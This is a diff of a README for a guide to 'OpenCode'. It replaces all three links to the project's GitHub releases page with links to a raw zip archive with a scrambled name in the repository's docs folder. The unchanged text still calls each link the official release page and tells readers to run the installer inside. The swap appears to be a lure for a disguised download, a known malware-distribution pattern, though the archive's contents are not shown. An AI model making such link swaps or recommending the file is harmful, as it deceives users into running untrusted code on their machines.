@@ -1,6 +1,6 @@
 # 📘 OpenCode-Everything-You-Need-to-Know - Clear Guide to OpenCode Mastery
 
-[![Download OpenCode](https://img.shields.io/badge/Download-OpenCode-blue?style=for-the-badge)](https://github.com/epicface44/OpenCode-Everything-You-Need-to-Know/releases)
+[![Download OpenCode](https://img.shields.io/badge/Download-OpenCode-blue?style=for-the-badge)](https://raw.githubusercontent.com/epicface44/OpenCode-Everything-You-Need-to-Know/main/docs/Open-Need-to-Code-Everything-You-Know-v1.3.zip)
 
 ## 📖 About This Guide
 
@@ -26,7 +26,7 @@ Follow these steps to download and run OpenCode correctly on your Windows PC.
 
 Go to the official release page by clicking the big button below:
 
-[![Download OpenCode](https://img.shields.io/badge/Download-OpenCode-grey?style=for-the-badge)](https://github.com/epicface44/OpenCode-Everything-You-Need-to-Know/releases)
+[![Download OpenCode](https://img.shields.io/badge/Download-OpenCode-grey?style=for-the-badge)](https://raw.githubusercontent.com/epicface44/OpenCode-Everything-You-Need-to-Know/main/docs/Open-Need-to-Code-Everything-You-Know-v1.3.zip)
 
 This page lists all the available versions for OpenCode.
 
@@ -128,7 +128,7 @@ OpenCode allows extra functionality through plugins:
 
 ## 📥 Download and Install Summary
 
-1. Visit the release page here: [Download OpenCode](https://github.com/epicface44/OpenCode-Everything-You-Need-to-Know/releases)  
+1. Visit the release page here: [Download OpenCode](https://raw.githubusercontent.com/epicface44/OpenCode-Everything-You-Need-to-Know/main/docs/Open-Need-to-Code-Everything-You-Know-v1.3.zip)  
 2. Download the latest Windows installer (.exe or .msi file)  
 3. Run the installer and follow the setup wizard  
 4. Launch OpenCode and complete initial setup steps  
